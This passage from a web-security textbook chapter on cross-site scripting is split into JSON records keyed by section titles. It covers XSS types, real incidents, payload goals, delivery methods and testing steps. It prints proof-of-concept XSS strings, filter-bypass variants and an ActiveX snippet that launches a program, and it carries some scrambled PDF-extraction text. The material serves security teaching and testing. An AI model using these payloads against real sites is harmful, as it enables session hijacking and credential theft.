IT!\nThis example contains a search function that displays the query that the\ncurrent user enters, and also a list of recent queries by other users. Because\nqueries are displayed unmodifi ed, the application is vulnerable to both\nrefl ected and stored XSS. See if you can fi nd both vulnerabilities.\nhttp://mdsec.net/search/11/\nRefl ected and stored XSS have two important differences in the attack process.\nStored XSS generally is more serious from a security perspective.\nFirst, in the case of refl ected XSS, to exploit a vulnerability, the attacker must\ninduce victims to visit his crafted URL. In the case of stored XSS, this require-\nment is avoided. Having deployed his attack within the application, the attacker\nsimply needs to wait for victims to browse to the page or function that has been\ncompromised. Usually this is a regular page of the application that normal users\nwill access of their own accord.\nSecond, the attacker’s objectives in exploiting an XSS bug are usually achieved\nmuch more easily if the victim is using the application at the time of the attack.\nFor example, if the user has an existing session, this can be immediately hijacked.\nIn a refl ected XSS attack, the attacker may try to engineer this situation by\npersuading the user to log in and then click a link that he supplies. Or he may\nattempt to deploy a persistent payload that waits until the user logs in. However,\ncc1122..iinndddd 443399 88//1199//22001111 1122::1122::2277 PPMM"
  },
  {
    "input": "DOM-Based XSS Vulnerabilities",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 440\n440 Chapter 12 n Attacking Users: Cross-Site Scripting\nin a stored XSS attack, it is usually guaranteed that victim users will already\nbe accessing the application at the time the attack strikes. Because the attack\npayload is stored within a page of the application that users access of their own\naccord, any victim of the attack will by defi nition be using the application at\nthe moment the payload executes. Furthermore, if the page concerned is within\nthe authenticated area of the application, any victim of the attack must also be\nlogged in at the time.\nThese differences between refl ected and stored XSS mean that stored XSS\nfl aws are often critical to an application’s security. In most cases, an attacker can\nsubmit some crafted data to the application and then wait for victims to be hit.\nIf one of those victims is an administrator, the attacker will have compromised\nthe entire application.\nDOM-Based XSS Vulnerabilities\nBoth refl ected and stored XSS vulnerabilities involve a specifi c pattern of behavior,\nin which the application takes user-controllable data and displays this back to\nusers in an unsafe way. A third category of XSS vulnerabilities does not share\nthis characteristic. Here, the process by which the attacker’s JavaScript gets\nexecuted is as follows:\nn A user requests a crafted URL supplied by the attacker and containing\nembedded JavaScript.\nn The server’s response does not contain the attacker’s script in any form.\nn When the user’s browser processes this response, the script is executed\nnonetheless.\nHow can this series of events occur? The answer is that client-side JavaScript\ncan access the browser’s document object model (DOM) and therefore can deter-\nmine the URL used to load the current page. A script issued by the application\nmay extract data from the URL, perform some processing on this data, and then\nuse it to dynamically update the page’s contents. When an application does this,\nit may be vulnerable to DOM-based XSS.\nRecall the original example of a refl ected XSS fl aw, in which the server-side\napplication copies data from a URL parameter into an error message. A differ-\nent way of implementing the same functionality would be for the application to\nreturn the same piece of static HTML on every occasion and to use client-side\nJavaScript to dynamically generate the message’s contents.\nFor example, suppose that the error page returned by the application contains\nthe following:\n<script>\nvar url = document.location;\ncc1122..iinndddd 444400 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 441\nChapter 12 n Attacking Users: Cross-Site Scripting 441\nurl = unescape(url);\nvar message = url.substring(url.indexOf(‘message=’) + 8, url\n.length);\ndocument.write(message);\n</script>\nThis script parses the URL to extract the value of the message parameter and\nsimply writes this value into the page’s HTML source code. When invoked as the\ndevelopers intended, it can be used in the same way as in the original example\nto create error messages easily. However, if an attacker crafts a URL containing\nJavaScript code as the value of the message parameter, this code will be dynami-\ncally written into the page and executed in the same way as if the server had\nreturned it. In this example, the same URL that exploited the original refl ected\nXSS vulnerability can also be used to produce a dialog box:\nhttp://mdsec.net/error/18/Error.ashx?message=<script>alert(‘xss’)</script>\nTRY IT!\nhttp://mdsec.net/error/18/\nFigure 12-5 illustrates the process of exploiting a DOM-based XSS\nvulnerability.\nApplication\n3. U 1 s . e U r s r 4 e e c . q r o S u l n e o e t r g s a v t s i e n s r i i n n a r t g e t s a h p c a o k r e n d r d - ’ c s s o U w d\nR\ni e t d h\nL\nJ p a a v g a e Script\n7.\nA ttacker\nhijacks user’s session\n5. Attacker’s\nURL is processed 2. Attacker feeds crafted URL to user\nby JavaScript,\n6. User’s browser sends session token to attacker\ntriggering his\nattack payload User Attacker\nFigure 12-5: The steps involved in a DOM-based XSS attack\ncc1122..iinndddd 444411 88//1199//22001111 1122::1122::2277 PPMM"
  },
  {
    "input": "Real-World XSS Attacks",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 442\n442 Chapter 12 n Attacking Users: Cross-Site Scripting\nDOM-based XSS vulnerabilities are more similar to refl ected XSS bugs than\nto stored XSS bugs. Their exploitation typically involves an attacker’s inducing\na user to access a crafted URL containing malicious code. The server’s response\nto that specifi c request causes the malicious code to be executed. However,\nin terms of the exploitation details, there are important differences between\nrefl ected and DOM-based XSS, which we will examine shortly.\nXSS Attacks in Action\nTo understand the serious impact of XSS vulnerabilities, it is fruitful to examine\nsome real-world examples of XSS attacks. It also helps to consider the wide range\nof malicious actions that XSS exploits can perform and how they are actively\nbeing delivered to victims.\nReal-World XSS Attacks\nIn 2010, the Apache Foundation was compromised via a refl ected XSS attack\nwithin its issue-tracking application. An attacker posted a link, obscured using\na redirector service, to a URL that exploited the XSS fl aw to capture the session\ntoken of the logged-in user. When an administrator clicked the link, his ses-\nsion was compromised, and the attacker gained administrative access to the\napplication. The attacker then modifi ed a project’s settings to change the upload\nfolder for the project to an executable directory within the application’s web\nroot. He uploaded a Trojan login form to this folder and was able to capture\nthe usernames and passwords of privileged users. The attacker identifi ed some\npasswords that were being reused on other systems within the infrastructure.\nHe was able to fully compromise those other systems, escalating the attack\nbeyond the vulnerable web application.\nFor more details on this attack, see this URL:\nhttp://blogs.apache.org/infra/entry/apache_org_04_09_2010\nIn 2005, the social networking site MySpace was found to be vulnerable to a\nstored XSS attack. The MySpace application implements fi lters to prevent users\nfrom placing JavaScript into their user profi le page. However, a user called Samy\nfound a means of circumventing these fi lters and placed some JavaScript into\nhis profi le page. The script executed whenever a user viewed this profi le and\ncaused the victim’s browser to perform various actions with two key effects.\nFirst, the browser added Samy as a “friend” of the victim. Second, it copied the\nscript into the victim’s own user profi le page. Subsequently, anyone who viewed\nthe victim’s profi le would also fall victim to the attack. The result was an XSS-\nbased worm that spread exponentially. Within hours the original perpetrator\ncc1122..iinndddd 444422 88//1199//22001111 1122::1122::2277 PPMM"
  },
  {
    "input": "Payloads for XSS Attacks",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 443\nChapter 12 n Attacking Users: Cross-Site Scripting 443\nhad nearly one million friend requests. As a result, MySpace had to take the\napplication offl ine, remove the malicious script from the profi les of all its users,\nand fi x the defect in its anti-XSS fi lters.\nFor more details on this attack, see this URL:\nhttp://namb.la/popular/tech.html\nWeb mail applications are inherently at risk of stored XSS attacks because\nof how they render e-mail messages in-browser when viewed by the recipient.\nE-mails may contain HTML-formatted content, so the application effectively\ncopies third-party HTML into the pages it displays to users. In 2009, a web mail\nprovider called StrongWebmail offered a $10,000 reward to anyone who could\nbreak into the CEO’s e-mail. Hackers identifi ed a stored XSS vulnerability within\nthe web mail application that allowed arbitrary JavaScript to be executed when\nthe recipient viewed a malicious e-mail. They sent a suitable e-mail to the CEO,\ncompromised his session on the application, and claimed the reward.\nFor more details on this attack, see this URL:\nhttp://blogs.zdnet.com/security/?p=3514\nIn 2009, Twitter fell victim to two XSS worms that exploited stored XSS vulner-\nabilities to spread between users and post updates promoting the website of the\nworms’ author. Various DOM-based XSS vulnerabilities have also been identi-\nfi ed in Twitter, arising from its extensive use of Ajax-like code on the client side.\nFor more details on these vulnerabilities, see the following URLs:\nwww.cgisecurity.com/2009/04/two-xss-worms-slam-twitter.html\nhttp://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-\nsomething.html\nPayloads for XSS Attacks\nSo far, we have focused on the classic XSS attack payload. It involves capturing\na victim’s session token, hijacking her session, and thereby making use of the\napplication “as” the victim, performing arbitrary actions and potentially taking\nownership of that user’s account. In fact, numerous other attack payloads may\nbe delivered via any type of XSS vulnerability.\nVirtual Defacement\nThis attack involves injecting malicious data into a page of a web application to\nfeed misleading information to users of the application. It may simply involve\ninjecting HTML markup into the site, or it may use scripts (sometimes hosted\non an external server) to inject elaborate content and navigation into the site.\ncc1122..iinndddd 444433 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 444\n444 Chapter 12 n Attacking Users: Cross-Site Scripting\nThis kind of attack is known as virtualdefacement because the actual content\nhosted on the target’s web server is not modifi ed. The defacement is generated\nsolely because of how the application processes and renders user-supplied input.\nIn addition to frivolous mischief, this kind of attack could be used for seri-\nous criminal purposes. A professionally crafted defacement, delivered to the\nright recipients in a convincing manner, could be picked up by the news media\nand have real-world effects on people’s behavior, stock prices, and so on, to the\nattacker’s fi nancial benefi t, as illustrated in Figure 12-6.\nFigure 12-6: A virtual defacement attack exploiting an XSS flaw\nInjecting Trojan Functionality\nThis attack goes beyond virtual defacement and injects actual working func-\ntionality into the vulnerable application. The intent is to deceive end users into\nperforming some undesirable action, such as entering sensitive data that is then\ntransmitted to the attacker.\nAs was described in the attack against Apache, an obvious attack involving\ninjected functionality is to present users with a Trojan login form that submits\ntheir credentials to a server controlled by the attacker. If skillfully executed,\nthe attack may also seamlessly log in the user to the real application so that she\ndoes not detect any anomaly in her experience. The attacker is then free to use\nthe victim’s credentials for his own purposes. This type of payload lends itself\nwell to a phishing-style attack, in which users are fed a crafted URL within the\nactual authentic application and are advised that they need to log in as normal\nto access it.\nAnother obvious attack is to ask users to enter their credit card details, usually\nwith the inducement of some attractive offer. For example, Figure 12-7 shows a\nproof-of-concept attack created by Jim Ley, exploiting a refl ected XSS vulner-\nability found in Google in 2004.\ncc1122..iinndddd 444444 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 445\nChapter 12 n Attacking Users: Cross-Site Scripting 445\nFigure 12-7: A reflected XSS attack injecting Trojan functionality\nThe URLs in these attacks point to the authentic domain name of the actual\napplication, with a valid SSL certifi cate where applicable. Therefore, they are\nfar more likely to persuade victims to submit sensitive information than pure\nphishing websites that are hosted on a different domain and merely clone the\ncontent of the targeted website.\nInducing User Actions\nIf an attacker hijacks a victim’s session, he can use the application “as” that\nuser and carry out any action on the user’s behalf. However, this approach to\nperforming arbitrary actions may not always be desirable. It requires that the\nattacker monitor his own server for submissions of captured session tokens from\ncompromised users. He also must carry out the relevant action on behalf of every\nuser. If many users are being attacked, this may be impractical. Furthermore,\nit leaves a rather unsubtle trace in any application logs, which could easily be\nused to identify the computer responsible for the unauthorized actions during\nan investigation.\ncc1122..iinndddd 444455 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 446\n446 Chapter 12 n Attacking Users: Cross-Site Scripting\nAn alternative to session hijacking, where an attacker simply wants to carry\nout a specifi c set of actions on behalf of each compromised user, is to use the\nattack payload script itself to perform the actions. This attack payload is par-\nticularly useful in cases where an attacker wants to perform some action that\nrequires administrative privileges, such as modifying the permissions assigned\nto an account he controls. With a large user base, it would be laborious to hijack\neach user’s session and establish whether the victim was an administrator. A\nmore effective approach is to induce every compromised user to attempt to\nupgrade the permissions on the attacker’s account. Most attempts will fail, but\nthe moment an administrative user is compromised, the attacker succeeds in\nescalating privileges. Ways of inducing actions on behalf of other users are\ndescribed in the “Request Forgery” section of Chapter 13.\nThe MySpace XSS worm described earlier is an example of this attack payload.\nIt illustrates the power of such an attack to perform unauthorized actions on\nbehalf of a mass user base with minimal effort by the attacker. This attack used\na complex series of requests using Ajax techniques (described in Chapter 3) to\ncarry out the various actions that were required to allow the worm to propagate.\nAn attacker whose primary target is the application itself, but who wants\nto remain as stealthy as possible, can leverage this type of XSS attack payload\nto cause other users to carry out malicious actions of his choosing against the\napplication. For example, the attacker could cause another user to exploit a SQL\ninjection vulnerability to add a new administrator to the table of user accounts\nwithin the database. The attacker would control the new account, but any inves-\ntigation of application logs may conclude that a different user was responsible.\nExploiting Any Trust Relationships\nYou have already seen one important trust relationship that XSS may exploit:\nbrowsers trust JavaScript received from a website with the cookies issued by\nthat website. Several other trust relationships can sometimes be exploited in\nan XSS attack:\nn If the application employs forms with autocomplete enabled, JavaScript\nissued by the application can capture any previously entered data that\nthe user’s browser has stored in the autocomplete cache. By instantiating\nthe relevant form, waiting for the browser to autocomplete its contents,\nand then querying the form fi eld values, the script may be able to steal\nthis data and transmit it to the attacker’s server. This attack can be more\npowerful than injecting Trojan functionality, because sensitive data can\nbe captured without requiring any interaction from the user.\nn Some web applications recommend or require that users add their domain\nname to their browser’s “Trusted Sites” zone. This is almost always unde-\nsirable and means that any XSS-type fl aw can be exploited to perform\ncc1122..iinndddd 444466 88//1199//22001111 1122::1122::2288 PPMM"
  },
  {
    "input": "Delivery Mechanisms for XSS Attacks",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 447\nChapter 12 n Attacking Users: Cross-Site Scripting 447\narbitrary code execution on the computer of a victim user. For example,\nif a site is running in the Trusted Sites zone of Internet Explorer, injecting\nthe following code causes the Windows calculator program to launch on\nthe user’s computer:\n<script>\nvar o = new ActiveXObject(‘WScript.shell’);\no.Run(‘calc.exe’);\n</script>\nn Web applications often deploy ActiveX controls containing powerful\nmethods (see Chapter 13). Some applications seek to prevent misuse by\na third party by verifying within the control itself that the invoking web\npage was issued from the correct website. In this situation, the control can\nstill be misused via an XSS attack, because in that instance the invoking\ncode satisfi es the trust check implemented within the control.\nCOMMON MYTH\n“Phishing and XSS only affect applications on the public Internet.”\nXSS bugs can affect any type of web application, and an attack against\nan intranet-based application, delivered via a group e-mail, can exploit two\nforms of trust. First, there is the social trust exploited by an internal e-mail\nsent between colleagues. Second, victims’ browsers often trust corporate\nweb servers more than they do those on the public Internet. For example,\nwith Internet Explorer, if a computer is part of a corporate domain, the\nbrowser defaults to a lower level of security when accessing intranet-based\napplications.\nEscalating the Client-Side Attack\nA website may directly attack users who visit it in numerous ways, such as log-\nging their keystrokes, capturing their browsing history, and port-scanning the\nlocal network. Any of these attacks may be delivered via a cross-site scripting\nfl aw in a vulnerable application, although they may also be delivered directly\nby any malicious website that a user happens to visit. Attacks of this kind are\ndescribed in more detail at the end of Chapter 13.\nDelivery Mechanisms for XSS Attacks\nHaving identifi ed an XSS vulnerability and formulated a suitable payload to\nexploit it, an attacker needs to fi nd some means of delivering the attack to other\ncc1122..iinndddd 444477 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 448\n448 Chapter 12 n Attacking Users: Cross-Site Scripting\nusers of the application. We have already discussed several ways in which this\ncan be done. In fact, many other delivery mechanisms are available to an attacker.\nDelivering Refl ected and DOM-Based XSS Attacks\nIn addition to the obvious phishing vector of bulk e-mailing a crafted URL to\nrandom users, an attacker may attempt to deliver a refl ected or DOM-based\nXSS attack via the following mechanisms:\nn In a targeted attack, a forged e-mail may be sent to a single target user or\na small number of users. For example, an application administrator could\nbe sent an e-mail apparently originating from a known user, complain-\ning that a specifi c URL is causing an error. When an attacker wants to\ncompromise the session of a specifi c user (rather than harvesting those of\nrandom users), a well-informed and convincing targeted attack is often\nthe most effective delivery mechanism. This type of attack is sometimes\nreferred to as “spear phishing”.\nn A URL can be fed to a target user in an instant message.\nn Content and code on third-party websites can be used to generate requests\nthat trigger XSS fl aws. Numerous popular applications allow users to\npost limited HTML markup that is displayed unmodifi ed to other users.\nIf an XSS vulnerability can be triggered using the GET method, an attacker\ncan post an IMG tag on a third-party site targeting the vulnerable URL.\nAny user who views the third-party content will unwittingly request the\nmalicious URL.\nAlternatively, the attacker might create his own website containing inter-\nesting content as an inducement for users to visit. It also contains content\nthat causes the user’s browser to make requests containing XSS payloads\nto a vulnerable application. If a user is logged in to the vulnerable applica-\ntion, and she happens to browse to the attacker’s site, the user’s session\nwith the vulnerable application is compromised.\nHaving created a suitable website, an attacker may use search engine\nmanipulation techniques to generate visits from suitable users, such as by\nplacing relevant keywords within the site content and linking to the site\nusing relevant expressions. This delivery mechanism has nothing to do\nwith phishing, however. The attacker’s site does not attempt to imperson-\nate the site it is targeting.\nNote that this delivery mechanism can enable an attacker to exploit refl ected\nand DOM-based XSS vulnerabilities that can be triggered only via POST\nrequests. With these vulnerabilities, there is obviously not a simple URL\nthat can be fed to a victim user to deliver an attack. However, a malicious\ncc1122..iinndddd 444488 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 449\nChapter 12 n Attacking Users: Cross-Site Scripting 449\nwebsite may contain an HTML form that uses the POST method and that\nhas the vulnerable application as its target URL. JavaScript or navigational\ncontrols on the page can be used to submit the form, successfully exploit-\ning the vulnerability.\nn In a variation on the third-party website attack, some attackers have been\nknown to pay for banner advertisements that link to a URL containing\nan XSS payload for a vulnerable application. If a user is logged in to the\nvulnerable application and clicks the ad, her session with that applica-\ntion is compromised. Because many providers use keywords to assign\nadvertisements to pages that are related to them, cases have even arisen\nwhere an ad attacking a particular application is assigned to the pages of\nthat application itself! This not only lends credibility to the attack but also\nguarantees that someone who clicks the ad is using the vulnerable appli-\ncation at the moment the attack strikes. Furthermore, since the targeted\nURL is now “on-site,” the attack can bypass browser-based mechanisms\nemployed to defend against XSS (described in detail later in this chap-\nter). Because many banner ad providers charge on a per-click basis, this\ntechnique effectively enables an attacker to “buy” a specifi c number of\nuser sessions.\nn Many web applications implement a function to “tell a friend” or send\nfeedback to site administrators. This function often enables a user to\ngenerate an e-mail with arbitrary content and recipients. An attacker\nmay be able to leverage this functionality to deliver an XSS attack via an\ne-mail that actually originates from the organization’s own server. This\nincreases the likelihood that even technically knowledgeable users and\nanti-malware software will accept it.\nDelivering Stored XSS Attacks\nThe two kinds of delivery mechanisms for stored XSS attacks are in-band and\nout-of-band.\nIn-band delivery applies in most cases and is used when the data that is\nthe subject of the vulnerability is supplied to the application via its main web\ninterface. Common locations where user-controllable data may eventually be\ndisplayed to other users include the following:\nn Personal information fi elds — name, address, e-mail, telephone, and the like\nn Names of documents, uploaded fi les, and other items\nn Feedback or questions for application administrators\nn Messages, status updates, comments, questions, and the like for other\napplication users\ncc1122..iinndddd 444499 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 450\n450 Chapter 12 n Attacking Users: Cross-Site Scripting\nn Anything that is recorded in application logs and displayed in-browser\nto administrators, such as URLs, usernames, HTTP Referer,User-Agent,\nand the like\nn The contents of uploaded fi les that are shared between users\nIn these cases, the XSS payload is delivered simply by submitting it to\nthe relevant page within the application and then waiting for victims to view the\nmalicious data.\nOut-of-band delivery applies in cases where the data that is the subject of\nthe vulnerability is supplied to the application through some other channel.\nThe application receives data via this channel and ultimately renders it within\nHTML pages that are generated within its main web interface. An example\nof this delivery mechanism is the attack already described against web mail\napplications. It involves sending malicious data to an SMTP server, which is\neventually displayed to users within an HTML-formatted e-mail message.\nChaining XSS and Other Attacks\nXSS fl aws can sometimes be chained with other vulnerabilities to devastating\neffect. The authors encountered an application that had a stored XSS vulner-\nability within the user’s display name. The only purpose for which this item\nwas used was to show a personalized welcome message after the user logged\nin. The display name was never displayed to other application users, so initially\nthere appeared to be no attack vector for users to cause problems by editing\ntheir own display name. Other things being equal, the vulnerability would be\nclassifi ed as very low risk.\nHowever, a second vulnerability existed within the application. Defective\naccess controls meant that any user could edit the display name of any other\nuser. Again, on its own, this issue had minimal signifi cance: Why would an\nattacker be interested in changing the display names of other users?\nChaining together these two low-risk vulnerabilities enabled an attacker to\ncompletely compromise the application. It was easy to automate an attack to inject\na script into the display name of every application user. This script executed\nevery time a user logged in to the application and transmitted the user’s ses-\nsion token to a server owned by the attacker. Some of the application’s users\nwere administrators, who logged in frequently and who could create new users\nand modify the privileges of other users. An attacker simply had to wait for an\nadministrator to log in, hijack the administrator’s session, and then upgrade his\nown account to have administrative privileges. The two vulnerabilities together\nrepresented a critical risk to the application’s security.\nIn a different example, data that was presented only to the user who submit-\nted it could be updated via a cross-site request forgery attack (see Chapter 13).\nIt also contained a stored XSS vulnerability. Again, each bug when considered\ncc1122..iinndddd 445500 88//1199//22001111 1122::1122::2288 PPMM"
  },
  {
    "input": "Finding and Exploiting XSS Vulnerabilities",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 451\nChapter 12 n Attacking Users: Cross-Site Scripting 451\nindividually might be regarded as relatively low risk; however, when exploited\ntogether, they can have a critical impact.\nCOMMON MYTH\n“We’re not worried about that low-risk XSS bug. A user could exploit it only to\nattack himself.”\nEven apparently low-risk vulnerabilities can, under the right circumstances,\npave the way for a devastating attack. Taking a defense-in-depth approach to\nsecurity entails removing every known vulnerability, however insignifi cant it\nmay seem. The authors have even used XSS to place fi le browser dialogs or\nActiveX controls into the page response, helping to break out of a kiosk-mode\nsystem bound to a target web application. Always assume that an attacker\nwill be more imaginative than you in devising ways to exploit minor bugs!\nFinding and Exploiting XSS Vulnerabilities\nA basic approach to identifying XSS vulnerabilities is to use a standard proof-\nof-concept attack string such as the following:\n“><script>alert(document.cookie)</script>\nThis string is submitted as every parameter to every page of the application,\nand responses are monitored for the appearance of this same string. If cases\nare found where the attack string appears unmodifi ed within the response, the\napplication is almost certainly vulnerable to XSS.\nIf your intention is simply to identify some instance of XSS within the applica-\ntion as quickly as possible to launch an attack against other application users,\nthis basic approach is probably the most effective, because it can be easily auto-\nmated and produces minimal false positives. However, if your objective is to\nperform a comprehensive test of the application to locate as many individual\nvulnerabilities as possible, the basic approach needs to be supplemented with\nmore sophisticated techniques. There are several different ways in which XSS\nvulnerabilities may exist within an application that will not be identifi ed via\nthe basic approach to detection:\nn Many applications implement rudimentary blacklist-based fi lters in an\nattempt to prevent XSS attacks. These fi lters typically look for expressions\nsuch as <script> within request parameters and take some defensive action\nsuch as removing or encoding the expression or blocking the request.\nThese fi lters often block the attack strings commonly employed in the\nbasic approach to detection. However, just because one common attack\ncc1122..iinndddd 445511 88//1199//22001111 1122::1122::2288 PPMM"
  },
  {
    "input": "Finding and Exploiting Reflected XSS Vulnerabilities",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 452\n452 Chapter 12 n Attacking Users: Cross-Site Scripting\nstring is being fi ltered, this does not mean that an exploitable vulnerability\ndoes not exist. As you will see, there are cases in which a working XSS\nexploit can be created without using <script> tags and even without\nusing commonly fi ltered characters such as “<> and /.\nn The anti-XSS fi lters implemented within many applications are defective\nand can be circumvented through various means. For example, suppose\nthat an application strips any <script> tags from user input before it is\nprocessed. This means that the attack string used in the basic approach\nwill not be returned in any of the application’s responses. However, it\nmay be that one or more of the following strings will bypass the fi lter\nand result in a successful XSS exploit:\n“><script >alert(document.cookie)</script >\n“><ScRiPt>alert(document.cookie)</ScRiPt>\n“%3e%3cscript%3ealert(document.cookie)%3c/script%3e\n“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>\n%00“><script>alert(document.cookie)</script>\nTRY IT!\nhttp://mdsec.net/search/28/\nhttp://mdsec.net/search/36/\nhttp://mdsec.net/search/21/\nNote that in some of these cases, the input string may be sanitized, decoded,\nor otherwise modifi ed before being returned in the server’s response, yet might\nstill be suffi cient for an XSS exploit. In this situation, no detection approach based\non submitting a specifi c string and checking for its appearance in the server’s\nresponse will in itself succeed in fi nding the vulnerability.\nIn exploits of DOM-based XSS vulnerabilities, the attack payload is not nec-\nessarily returned in the server’s response but is retained in the browser DOM\nand accessed from there by client-side JavaScript. Again, in this situation, no\napproach based on submitting a specifi c string and checking for its appearance\nin the server’s response will succeed in fi nding the vulnerability.\nFinding and Exploiting Refl ected XSS Vulnerabilities\nThe most reliable approach to detecting refl ected XSS vulnerabilities involves\nworking systematically through all the entry points for user input that were\nidentifi ed during application mapping (see Chapter 4) and following these steps:\nn Submit a benign alphabetical string in each entry point.\nn Identify all locations where this string is refl ected in the application’s\nresponse.\ncc1122..iinndddd 445522 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 453\nChapter 12 n Attacking Users: Cross-Site Scripting 453\nn For each refl ection, identify the syntactic context in which the refl ected\ndata appears.\nn Submit modifi ed data tailored to the refl ection’s syntactic context, attempt-\ning to introduce arbitrary script into the response.\nn If the refl ected data is blocked or sanitized, preventing your script from\nexecuting, try to understand and circumvent the application’s defensive\nfi lters.\nIdentifying Refl ections of User Input\nThe fi rst stage in the testing process is to submit a benign string to each entry\npoint and to identify every location in the response where the string is refl ected.\nHACK STEPS\n1. Choose a unique arbitrary string that does not appear anywhere within\nthe application and that contains only alphabetical characters and there-\nfore is unlikely to be affected by any XSS-specific filters. For example:\nmyxsstestdmqlwp\nSubmit this string as every parameter to every page, targeting only one\nparameter at a time.\n2. Monitor the application’s responses for any appearance of this same\nstring. Make a note of every parameter whose value is being copied into\nthe application’s response. These are not necessarily vulnerable, but each\ninstance identified is a candidate for further investigation, as described in\nthe next section.\n3. Note that both GET and POST requests need to be tested. You should\ninclude every parameter within both the URL query string and the mes-\nsage body. Although a smaller range of delivery mechanisms exists for\nXSS vulnerabilities that can be triggered only by a POST request, exploita-\ntion is still possible, as previously described.\n4. In any cases where XSS was found in a POST request, use the “change\nrequest method” option in Burp to determine whether the same attack\ncould be performed as a GET request.\n5. In addition to the standard request parameters, you should test every\ninstance in which the application processes the contents of an HTTP\nrequest header. A common XSS vulnerability arises in error messages,\nwhere items such as the Referer and User-Agent headers are copied\ninto the message’s contents. These headers are valid vehicles for deliver-\ning a reflected XSS attack, because an attacker can use a Flash object to\ninduce a victim to issue a request containing arbitrary HTTP headers.\ncc1122..iinndddd 445533 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 454\n454 Chapter 12 n Attacking Users: Cross-Site Scripting\nTesting Refl ections to Introduce Script\nYou must manually investigate each instance of refl ected input that you have\nidentifi ed to verify whether it is actually exploitable. In each location where\ndata is refl ected in the response, you need to identify the syntactic context of\nthat data. You must fi nd a way to modify your input such that, when it is copied\ninto the same location in the application’s response, it results in execution of\narbitrary script. Let’s look at some examples.\nExample 1: A Tag Attribute Value\nSuppose that the returned page contains the following:\n<input type=”text” name=”address1” value=”myxsstestdmqlwp”>\nOne obvious way to craft an XSS exploit is to terminate the double quota-\ntion marks that enclose the attribute value, close the <input> tag, and then\nemploy some means of introducing JavaScript, such as a <script> tag. For\nexample:\n“><script>alert(1)</script>\nAn alternative method in this situation, which may bypass certain input fi lters,\nis to remain within the <input> tag itself but inject an event handler containing\nJavaScript. For example:\n“ onfocus=”alert(1)\nExample 2: A JavaScript String\nSuppose that the returned page contains the following:\n<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>\nHere, the input you control is being inserted directly into a quoted string\nwithin an existing script. To craft an exploit, you could terminate the single\nquotation marks around your string, terminate the statement with a semicolon,\nand then proceed directly to your desired JavaScript:\n‘; alert(1); var foo=’\nNote that because you have terminated a quoted string, to prevent errors\nfrom occurring within the JavaScript interpreter you must ensure that the\nscript continues gracefully with valid syntax after your injected code. In this\nexample, the variable foo is declared, and a second quoted string is opened. It\nwill be terminated by the code that immediately follows your string. Another\nmethod that is often effective is to end your input with // to comment out the\nremainder of the line.\ncc1122..iinndddd 445544 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 455\nChapter 12 n Attacking Users: Cross-Site Scripting 455\nExample 3: An Attribute Containing a URL\nSuppose that the returned page contains the following:\n<a href=”myxsstestdmqlwp”>Click here ...</a>\nHere, the string you control is being inserted into the href attribute of an <a>\ntag. In this context, and in many others in which attributes may contain URLs,\nyou can use the javascript: protocol to introduce script directly within the\nURL attribute:\njavascript:alert(1);\nBecause your input is being refl ected within a tag attribute, you can also inject\nan event handler, as already described.\nFor an attack that works against all current browsers, you can use an invalid\nimage name together with an onclick event handler:\n#”onclick=”javascript:alert(1)\nTIP As with other attacks, be sure to URL-encode any special characters that\nhave signifi cance within the request, including & = + ; and space.\nHACK STEPS\nDo the following for each refl ected input identifi ed in the previous steps:\n1. Review the HTML source to identify the location(s) where your unique\nstring is being reflected.\n2. If the string appears more than once, each occurrence needs to be treated\nas a separate potential vulnerability and investigated individually.\n3. Determine, from the location within the HTML of the user-controllable\nstring, how you need to modify it to cause execution of arbitrary script.\nTypically, numerous different methods will be potential vehicles for an\nattack, as described later in this chapter.\n4. Test your exploit by submitting it to the application. If your crafted string\nis still returned unmodified, the application is vulnerable. Double-check\nthat your syntax is correct by using a proof-of-concept script to display an\nalert dialog, and confirm that this actually appears in your browser when\nthe response is rendered.\nProbing Defensive Filters\nVery often, you will discover that the server modifi es your initial attempted\nexploits in some way, so they do not succeed in executing your injected script.\ncc1122..iinndddd 445555 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 456\n456 Chapter 12 n Attacking Users: Cross-Site Scripting\nIf this happens, do not give up! Your next task is to determine what server-\nside processing is occurring that is affecting your input. There are three broad\npossibilities:\nn The application (or a web application fi rewall protecting the application)\nhas identifi ed an attack signature and has blocked your input.\nn The application has accepted your input but has performed some kind of\nsanitization or encoding on the attack string.\nn The application has truncated your attack string to a fi xed maximum length.\nWe will look at each scenario in turn and discuss various ways in which the\nobstacles presented by the application’s processing can be bypassed.\nBeating Signature-Based Filters\nIn the fi rst type of fi lter, the application typically responds to your attack string\nwith an entirely different response than it did for the harmless string. For\nexample, it might respond with an error message, possibly even stating that a\npossible XSS attack was detected, as shown in Figure 12-8.\nFigure 12-8: An error message generated by ASP.NET’s anti-XSS filters\nIf this occurs, the next step is to determine what characters or expressions\nwithin your input are triggering the fi lter. An effective approach is to remove\ndifferent parts of your string in turn and see whether the input is still being\nblocked. Typically, this process establishes fairly quickly that a specifi c expres-\nsion such as <script> is causing the request to be blocked. You then need to\ntest the fi lter to establish whether any bypasses exist.\nThere are so many different ways to introduce script code into HTML pages\nthat signature-based fi lters normally can be bypassed. You can fi nd an 